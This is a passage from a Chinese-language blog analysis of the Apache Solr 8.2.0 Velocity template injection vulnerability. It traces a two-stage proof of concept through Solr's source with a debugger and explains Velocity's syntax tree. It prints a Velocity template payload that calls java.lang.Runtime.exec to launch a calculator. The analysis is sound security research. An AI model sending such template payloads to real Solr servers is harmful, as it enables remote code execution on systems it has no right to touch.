rel="noopener">界面设计</a>人员可以和java程序开发人员同步开发一个遵循MVC架构的web站点，也就是说，页面设计人员可以只关注页面的显示效果，而由java程序开发人员关注业务逻辑编码。Velocity将java代码从web页面中分离出来，这样为web站点的长期维护提供了便利，同时也为我们在JSP和PHP之外又提供了一种可选的方案。</p><p>前面说了这么多，现在我们在这里简单演示下Velocity这个模板引擎，给大家一个更直观的概念。</p><p>首先导入以下的包</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/14.png" alt="14"></p><p>然后我们创建一个演示类</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/15.png" alt="15"></p><p>这里我们首先实例话了一个VelocityEngine，并设置加载加载classpath目录下的vm文件</p><p>然后初始化VelocityEngine，接着就是加载一个模板，这里模板的名字叫“Hellovelocity.vm” 接下来的操作就是我们向模板的上下文中添加我们要传递的参数和值了。</p><p>最后的t.merget就会开始循环遍历生成的Velocity AST语法书的各个节点，执行每个节点的渲染方法。</p><p>我们看一下我们加载的这个模板的具体实现</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/16.png" alt="16"></p><p>和最终的执行结果</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/17.png" alt="17"></p><p>我们看到这里可以将我们之前后端代码中传输的值直接取出也可以循环取出。</p><p>这样我们就可以提前将静态部分用HTML和JavaScript写好，然后需要动态交互的部分就可以使用Velocity语法来进行编写。</p><h2 id="3-漏洞和POC构造分析"><a href="#3-漏洞和POC构造分析" class="headerlink" title="3  漏洞和POC构造分析"></a>3  漏洞和POC构造分析</h2><h3 id="3-1-漏洞分析环境搭建"><a href="#3-1-漏洞分析环境搭建" class="headerlink" title="3.1 漏洞分析环境搭建"></a>3.1 漏洞分析环境搭建</h3><p>首先我们下载Apache Slor 8.2.0源码</p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0-src.tgz" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0-src.tgz</a></p><p>下载完成后</p><p>我们进入Solr源码根目录</p><p>执行命令</p><p>ant ivy-bootstrap</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/18.png" alt="18"></p><p>然后再执行ant idea命令将源码转化成idea可以导入的模式</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/19.png" alt="19"></p><p>然后我们打开idea，选择open</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/20.png" alt="20"></p><p>最后导入完成后的样子</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/21.png" alt="21"></p><p>为了可以调试源码，我们需要再做一些配置</p><p>点开左上角的Edit Configuration</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/22.png" alt="22"></p><p>然后新增Remote</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/23.png" alt="23"></p><p>并按照如下配置</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/24.png" alt="24"></p><p>配置完成后我们进入solr的服务端的bin目录，并执行如下命令</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/25.png" alt="25"></p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/26.png" alt="26"></p><p>然后我们带idea中点击debug按钮，当有如下显示时代表调试环境搭建成功，</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/27.png" alt="27"></p><p>接下来我们就可以在自己想下断点的地方下断点了。</p><h3 id="3-2-POC第一部分执行和构造分析"><a href="#3-2-POC第一部分执行和构造分析" class="headerlink" title="3.2 POC第一部分执行和构造分析"></a>3.2 POC第一部分执行和构造分析</h3><p>首先我们就来一步一步分析这个漏洞吧，审计一个web项目我们首先先看有没有web.xml这个文件</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/28.png" alt="28"></p><p>我们找到了web.xml这个文件，位置在solr/webapp/WEB-INF/目录下</p><p>我们打开看一下内容</p><p>首先这个web.xml文件一开始就是一个filter过滤器，这个过滤器类路径是</p><p>org.apache.solr.servlet.SolrDispatchFilter，拦截的范围是所有请求</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/29.png" alt="29"></p><p>所以我们首先就需要去这个SolrDispatchFilter这个类去观察</p><p>此时我们有两条分析接下来漏洞走向的方式，我们通过查阅网上的资料得知</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/30.png" alt="30"></p><p>我们去目录下查看一下</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/31.png" alt="31"></p><p>果然有这两个文件</p><p>然后我们看下两个文件的部分内容，先看下solrconfig.xml</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/32.png" alt="32"></p><p>可以看到velocity.params.resource.loader.enabled参数默认是flase，也就是说是默认是不开启的。</p><p>我们在看一看configoverlay.json文件</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/33.png" alt="33"></p><p>看到这里存储着我们上传上来的参数，这里我们将params.resource.loader.enabled制为true</p><p>我们可以通过观察该文件何时被修改来判断，是否该跟进代码中。</p><p>然后我们观察poc的时候不难发现请求的API为“/config”</p><p>我们通过查阅资料发现</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/34.png" alt="34"></p><p>Solr中有很多的RequestHandler，默认配置在solrconfig.xml中，同时也有很多没有配置在solrconfig.xml，称为隐式RequestHandler。而“/config”就是其中之一，我们可以看到SolrConfigHandler便是处理提交我们提交poc的API之一</p><p>但是为了，讲的更加清晰，我们还是从SolrDispatchFilter.doFilter方法来一步一步的跟踪。</p><p>首先SolrDispatchFilter.doFilter方法执行到第 423行的时候，</p><p>会调用HttpSolrCall.call方法</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/35.png" alt="35"></p><p>我们跟进这个方法</p><p>然后代码执行到execute()方法时configoverlay.json文件更新了 所以我们跟进这个函数</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/36.png" alt="36"></p><p>继续跟进</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/37.png" alt="37"></p><p>  按照上面的思路，执行到handler.handleRequest()继续跟进  </p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/38.png" alt="38"></p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/39.png" alt="39"></p><p>此时就进入到了一开始我们从资料中所看到的“/config”所对应的类SolrConfigHandler，</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/40.png" alt="40"></p><p>由于此时进入这个函数是为了调用它的handleRequestBody方法，所以我们接着向下执行</p><p>这里POST用来修改数据。GET用来查询数据，所以我们执行到</p><p>command.handlePOST()方法然后跟进</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/41.png" alt="41"></p><p>执行到handleCommands()方法 此时传入的opsCopy就是我们从前端传入的配置信息，而overlay时当前的配置信息</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/42.png" alt="42"></p><p>继续跟进，当执行到SolrResourceLoader.persistConfLocally()方法时</p><p>configoverlay.json，文件更新了，</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/43.png" alt="43"></p><p>此时我们看到，关键参数时overlay.toButeArray()</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/44.png" alt="44"></p><p>而overlay参数最近的一次赋值动作是在这行代码里进行的，我们先跟进updateNamedPlugin()方法看一看</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/45.png" alt="45"></p><p>updateNamedPlugin方法中将op 和overlay参数都传入了进去</p><p>当执行到这个if判断时，判断为真，返回overlay，所以关键在于</p><p>Verifyclass()这个函数。</p><p>这里op仍然为我们 post传入的配置参数 clz的值为“solr.VelocityResponseWriter”</p><p>继续跟进</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/46.png" alt="46"></p><p>跟进函数之后我们看到这样一行代码</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/47.png" alt="47"></p><p>根据执行逻辑首先执行getCore方法，返回一个SolrCore对象</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/48.png" alt="48"></p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/49.png" alt="49"></p><p>然后执行op.getDataMap()方法，返回一个Map对像</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/50.png" alt="50"></p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/51.png" alt="51"></p><p>然后new 一个PluginInfo对象，构造方法里的主要操作就是向一个 NameList类型的对象中存值，存入的是我们POST传入的配置参数。</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/52.png" alt="52"></p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/53.png" alt="53"></p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/54.png" alt="54"></p><p>createInitInstance()方法</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/55.png" alt="55"></p><p>泛型变量o是根据我们传入的参数PulginInfo对象的className属性“solr.VelocityResponseWriter”然后通过createInstance()方法反射获得的VelocityResponseWriter对象</p><p>因为VelocityResponseWriter对象实现了NamedListInitializedPlugin接口</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/56.png" alt="56"></p><p>所以执行</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/57.png" alt="57"></p><p>跟进</p><p>然后我们进入了VelocityResponseWriter对象的init方法，在这里有这么几行代码</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/58.png" alt="58"></p><p>可以看到在这里我们将VelocityResponseWriter对像的两个重要属性</p><p>paramsResourceLoaderEnabled，</p><p>solrResourceLoaderEnabled</p><p>设置为了true，也就是允许我们上传自定义模板了</p><p>紧接着init方法执行结束后，就会将VelocityResponseWriter对象按原路返回到SolrConfigHandler并赋值给overly属性</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/59.png" alt="59"></p><p>紧接着执行到第504行代码时configoverlay.json文件更新了，我们跟进这个方法</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/60.png" alt="60"></p><p>在调用SolrResourceLoader.persistConfLocally()方法时，可以看到我们将</p><p>overly作为参数传递了进去</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/61.png" alt="61"></p><p>此时观察代码我们就明白了，真正将我们post传递的配置参数写入文件的操作是在这一步进行的。至此 poc的第一部分追踪完毕。</p><h3 id="3-3-POC第二部分执行和构造分析"><a href="#3-3-POC第二部分执行和构造分析" class="headerlink" title="3.3  POC第二部分执行和构造分析"></a>3.3  POC第二部分执行和构造分析</h3><p>接下来是poc执行的第二阶段</p><p>老规矩先从SolrDispatchFilter类看起</p><p>执行到HttpSolrCall.call步入</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/62.png" alt="62"></p><p>紧接着执行到HttpSolrCall.writeResponse方法</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/63.png" alt="63"></p><p>观察此刻传入的三个参数，solrRsp参数是一个 SolrQueryResponse对象，我们GET传入的playload存储在该对象的value属性中</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/64.png" alt="64"></p><p>这个responseWriter对象相当重要，这里我们看到了两个参数</p><p>paramsResourceLoaderEnabled和solrResourceLoaderEnabled</p><p>这是我们poc第一步中修改的两个配置属性，只有这两个属性为true我们才可以上传自定义模板成功</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/65.png" alt="65"></p><p>responseWriter参数指向的是一个VelocityResponseWriter对象，responseWriter最近一次被赋值是在，下面这行代码中</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/66.png" alt="66"></p><p>本着刨根问底，以及锻炼我们分析代码执行逻辑能力的目的，我们深入了解一下</p><p>我们跟踪进HttpSolrCall.getResponseWriter方法</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/67.png" alt="67"></p><p>可以看到，这里将我们GET穿入的key的值为wt的属性里面的值velocity取出并作为参数传给了core.getQueryResponseWriter方法，core参数指向的是一个SolrCore对象</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/68.png" alt="68"></p><p>跟入SolrCore.getQueryResponseWriter方法，</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/69.png" alt="69"></p><p>跟入responseWriters.get方法，</p><p>此时我们来到了一个PluginBag对象的get方法 </p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/70.png" alt="70"></p><p>在执行完T result = get(name)方法后 result的结果中是一个VelocityResponseWriter对象且</p><p>paramsResourceLoaderEnabled和solrResourceLoaderEnabled属性都已被置为true，就是说给这两个属性赋值的操作就在get(name)这个方法里。继续跟进</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/71.png" alt="71"></p><p>还是继续跟进result的无参get方法</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/72.png" alt="72"></p><p>到这里，就出现问题了</p><p>这里会判断一个名字叫lazyInst的属性是否为空，如果不为空，则返回这个属性。</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/73.png" alt="73"></p><p>我们来看看此时这个lazyInst属性是什么，</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/74.png" alt="74"></p><p>可以看到就是我们最终返回的VelocityResponseWriter对象。</p><p>那么问题就来了，我们这执行过程中并没有看到lazyInst对象被赋值，那么lazyInst属性指向的VelocityResponseWriter对象是哪来的呢？</p><p>我们会退一步，观察这行代码</p><p>PluginHolder<t> result = registry.get(name);</t></p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/75.png" alt="75"></p><p>registry是一个hashmap类型，有final标识符</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/76.png" alt="76"></p><p>观察此时registry里面的内容</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/77.png" alt="77"></p><p>又因为registry.get(name)传入的name参数的值为velocity</p><p>我们打开这里的velocity</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/78.png" alt="78"></p><p>赫然看到那个lazyInst就在里面，我们知道标示的final的属性就是常量了，在对像生成被赋值了一次以后就不会再更改了。我通过多次发送poc请求测试发现每次到这个断点时当前的对象ID都是相同的，所以每次执行调用的都是同一个对像。</p><p>我们重新发送poc的第一部分。Poc第一部分请求完成后再在此处下断点</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/79.png" alt="79"></p><p>此时lazyInst属性就为空了</p><p>我们继续执行</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/80.png" alt="80"></p><p>此时由于lazyInst为空了，所以不会直接返回，我们跟进createInst方法，</p><p>看到在createInst方法的最后lazyInst属性被赋值，我们向上寻找这个localInst变量</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/81.png" alt="81"></p><p>在下面这行代码中localInst第一次被赋值</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/82.png" alt="82"></p><p>此时localInst中的内容为</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/83.png" alt="83"></p><p>也就是说此时程序只是从solrconfig.xml中读取了默认的配置，还并没有读取</p><p>configoverlay.json中我们更新的配置。</p><p>所以这行就不跟进了。</p><p>当执行到initInstance(localInst, pluginInfo)这行代码时</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/84.png" alt="84"></p><p>我们清楚的看到参数被更新了，那我们就跟入这行代码</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/85.png" alt="85"></p><p>跟入((NamedListInitializedPlugin) inst).init(info.initArgs)</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/86.png" alt="86"></p><p>然后就又看到了我们执行poc第一部分时所碰到的代码了，至此获取</p><p>configoverlay.json中我们更新的配置信息的执行逻辑我们已经分析完毕</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/87.png" alt="87"></p><p>接下来继续原路返回到我们调用HttpSolrCall.getResponseWriter的位置</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/88.png" alt="88"></p><p>继续跟进writeResponse(solrRsp, responseWriter, reqMethod);</p><p>此时solrRsp中存放的是我们Get传入的poc，responseWriter中存放的是我们configoverlay.json文件中存放的更新配置。</p><p>跟入QueryResponseWriterUtil.writeQueryResponse方法。</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/89.png" alt="89"></p><p>跟入responseWriter.write方法</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/90.png" alt="90"></p><p>我们执行createEngine()方法时生成了一个VelocityEngine对象</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/91.png" alt="91"></p><p>我们进入createEngine()方法后可以看到方法内的第一行代码就是new一个VelocityEngine对象</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/92.png" alt="92"></p><p>关键点在以下这几行代码，这里对</p><p>paramsResourceLoaderEnabled</p><p>solrResourceLoaderEnabled两个参数进行了判断，当</p><p>paramsResourceLoaderEnabled参数为true时执行</p><p>loaders.add(“params”);</p><p>engine.setProperty(“params.resource.loader.instance”, new SolrParamResourceLoader(request));</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/93.png" alt="93"></p><p>根据网上查到的资料我们可以看到params.resource.loader.instance这个属性的含义</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/94.png" alt="94"></p><p>也就是说当开启这个属性的时候，我们就可以通过Solr来上传我们自定义的模板了。</p><p>最后返回VelocityEngine对象</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/95.png" alt="95"></p><p>返回到responseWriter.write方法，继续执行到</p><p>Template template = getTemplate(engine, request);</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/96.png" alt="96"></p><p>这里我们生成了一个template</p><p>跟进去后我们看到</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/97.png" alt="97"></p><p>从我们Get传入的参数中获取V.template作为模板的名字</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/98.png" alt="98"></p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/99.png" alt="99"></p><p>同时将我们传入的Poc也就时Velocity模板语句解析成AST抽象语法树</p><p>这里就要对velocity的AST抽象语法树做一下简单的介绍了</p><p>在计算机科学中，抽象语法树（abstract syntax tree 或者缩写为 AST），或者语法树（syntax tree），是源代码的抽象语法结构的树状表现形式，这里特指编程语言的源代码。树上的每个节点都表示源代码中的一种结构。</p><p>之所以说语法是「抽象」的，是因为这里的语法并不会表示出真实语法中出现的每个细节。</p><p>Velocity是通过JavaCC和JJTree生成抽象语法树的,</p><p>javaCC 是一个能生成语法和词法分析器的生成程序。语法和词法分析器是字符串处理软件的重要组件，<a href="http://www.google.com/url?sa=t&amp;ct=res&amp;cd=1&amp;url=https%3A%2F%2Fjavacc.dev.java.net%2F&amp;ei=9DVYRYiNNqOEpgKyrbivCQ&amp;usg=__mFYMOj71sh29a1K1V8lPTOwCBok=&amp;sig2=hEpGu_jpqYUmHxmOExyoMg" target="_blank" rel="noopener">javacc</a>是类似lex/yacc的parser生成器，可以把一段文本转换为抽象语法树（AST）。</p><p>JJTree是javaCC的预处理器，用于在JavaCC生成的源代码中的各个地方插入表示语义动作的分析树</p><p>用网上的一张图来介绍一下AST的一些节点</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/100.png" alt="100"></p><p>Velocity的语法相对简单，所以它的语法节点并不是很多，总共有50几个，它们可以划分为如下几种类型。</p><ol><li><p>块节点类型：主要用来表示一个代码块，它们本身并不表示某个具体的语法节点，也不会有什么渲染规则。这种类型的节点主要由ASTReference、ASTBlock和ASTExpression等组成。</p></li><li><p>扩展节点类型：这些节点可以被扩展，可以自己去实现，如我们上面提到的#foreach，它就是一个扩展类型的ASTDirective节点，我们同样可以自己再扩展一个ASTDirective类型的节点。</p></li><li><p>中间节点类型：位于树的中间，它的下面有子节点，它的渲染依赖于子节点才能完成，如ASTIfStatement和ASTSetDirective等。</p></li><li><p>叶子节点：它位于树的叶子上，没有子节点，这种类型的节点要么直接输出值，要么写到writer中，如ASTText和ASTTrue等。 </p></li></ol><p>我们再来看一下poc中的Velocity语句，和children中的节点信息</p><p>#set($x=’’) </p><p>#set($rt=$x.class.forName(‘java.lang.Runtime’)) </p><p>#set($ex=$rt.getRuntime().exec(‘open /Applications/Calculator.app/‘))</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/101.png" alt="101"></p><p>#set最终被解析为Velocity AST语法树中的ASTSetDirective类，根据上面的Velocity AST语法树的图我们看到ASTSetDirective节点有两个字节点</p><p>分别是ASTReference,和ASTExpression,</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/102.png" alt="102"></p><p>我们看到下标为0的ASTSetDirective类中有两个属性。right和left</p><p>分别代表了$x=’’中“=”号的两边，左边的ASTReference有两种可能，</p><p>一就是用来进行赋值操作的变量名</p><p>例：#set( $iAmVariable = ‘good!’)将字面量“good”赋值给名字为iAmVariable的变量</p><p>第二种也是赋值操作，但是赋值操作的目标是一个对象的某个属性</p><p>例：#set($Persion.name = ‘kkk’)</p><p>这种赋值方式的本质其实是调用Persion的setName方法。</p><p>区分这两种赋值方式我们可以动过观察此时的ASTReference这个节点是否有子节点来判断</p><p>譬如第一种#set( $iAmVariable = ‘good!’) 我们观察一下</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/103.png" alt="103"></p><p>可以看到最后的children属性为空</p><p>再观察第二种#set($Persion.name = ‘kkk’)</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/104.png" alt="104"></p><p>可以看到children属性中，是有子节点的。</p><p>Velocity通过ASTReference类来表示一个变量和变量的方法调用，ASTReference类如果有子节点，就表示这个变量有方法调用，方法调用同样是通过“.”来区分的，每一个点后面会对应一个方法调用。ASTReference有两种类型的子节点，分别是ASTIdentifier和ASTMethod。它们分别代表两种类型的方法调用，其中ASTIdentifier主要表示隐式的“get”和“set”类型的方法调用。而ASTMethod表示所有其他类型的方法调用，如所有带括号的方法调用都会被解析成ASTMethod类型的节点。</p><p>所谓隐式方法调用在Velocity中通常有如下几种。</p><p>1.Set类型，如#set($person.name=”junshan”)，如下：</p><p>·    person.setName(“junshan”)</p><p>·    person.setname(“junshan”)</p><p>·    person.put(“name”,”junshan”)</p><p>2.Get类型，如#set($name=$person.name)中的$person.name，如下：</p><p>·    person.getName()</p><p>·    person.getname()</p><p>·    person.get(“name”)</p><p>·    person.isname()</p><p>·    person.isName()</p><p>接下来我们来看ASTText节点，我们从节点图中看到ASTText没有任何子节点了，它是一个叶子结点，所以这种类型的节点要么直接输出值，要么写到writer中。</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/105.png" alt="105"></p><p>到这里我们简单介绍了下Velocity AST语法树的一些基础知识。接下来我们回归我们程序的执行逻辑。</p><p>接下来的velocity模板引擎的执行逻辑现在这里简单说明一下，其实也很简单，其实就是会不停的遍历和执行各个子节点中的render方法</p><p>首先根据Velocity AST语法树的那张图，我们看到总的根节点是ASTprocess</p><p>所以会首先调用ASTprocess的render方法，具体在哪里调用呢，我们来看代码</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/106.png" alt="106"></p><p>继续跟入</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/107.png" alt="107"></p><p>当执行到((SimpleNode)data).render(ica,writer);</p><p>这行代码是，我们可以看到此时的data就是ASTprocess节点，所以Template.merge方法中调用了AST的根节点(ASTprocess)的render方法((SimpleNode)data).render(ica,writer);。此调用将迭代处理各个子节点render方法。如果是ASTReference类型的节点则在render方法中会调用execute方法执行反射替换相关处理。</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/108.png" alt="108"></p><p>当进入到ASTprocess节点的render方法后会根据深度优先遍历算法开始遍历整棵树，遍历算法如下</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/109.png" alt="109"></p><p>即依次执行当前节点中的所有子节点的render方法，而每个节点的具体渲染规则都在其对应节点的render方法中实现。</p><p>这里我们可以打印一下我们poc所生成的语法树的详细结构</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/110.png" alt="110"></p><p>有了这个语法树结构后，程序的执行顺序就相当清晰了。</p><p>我们首先调用了ASTSetDirective类的render方法，看到该方法中首先调用了ASTExpression类value方法。</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/111.png" alt="111"></p><p>而ASTExpression类value方法中又调用了它的子节点ASTStringLiteral</p><p>节点的value方法</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/112.png" alt="112"></p><p>最后ASTStringLiteral类的value方法返回一个字面量 </p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/113.png" alt="113"></p><p>接着返回到ASTSetDirective类执行它的第二个子节点也就是等号左边的$x</p><p>这里对应的是ASTReference类，这里是调用了ASTReference类的setValue方法</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/114.png" alt="114"></p><p>跟入方法后可以看到，由于该ASTReference节点没有子节点了，所以</p><p>直接执行</p><p>context.put(rootString, value);这里的value就是我们刚刚获得的“=”号右边的字面量</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/115.png" alt="115"></p><p>我们跟进去看一眼，能看得出后续就是赋值操作了，就不继续深入了</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/116.png" alt="116"></p><p>Poc第一行#set($x=’’)执行完毕</p><p>然后开始遍历第二个节点</p><p>第二个节点是ASTText节点，这个没什么好说的，就只是直接输出或着写到write中</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/117.png" alt="117"></p><p>然后开始遍历第三个节点</p><p>第三个节点仍然是ASTSetDirective类，它的render方法中仍然是先执行“=”号右边的子节点ASTExpression类的value方法</p><p>当执行到该方法时我们可以看到，此时的ASTExpression节点还有一个子节点，但是不是ASTStringLiteral节点了，而是ASTReference节点</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/118.png" alt="118"></p><p>所以此次执行的将会是ASTReference类的value方法</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/119.png" alt="119"></p><p>执行execute方法</p><p>我们重点看execute中的这行代码</p><p>Object result = getVariableValue(context, 